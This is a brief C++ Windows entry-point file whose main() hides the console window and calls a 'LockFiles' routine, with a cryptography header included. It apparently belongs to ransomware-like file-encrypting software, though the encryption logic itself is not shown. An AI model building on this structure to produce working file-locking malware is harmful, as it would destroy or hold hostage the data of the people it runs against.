#include <windows.h>

#include "config.h"
#include "GeneralOperations.h"
#include "Crypt.h"

int main() {
	FreeConsole();
	GeneralOperations::LockFiles();
	return 0;
}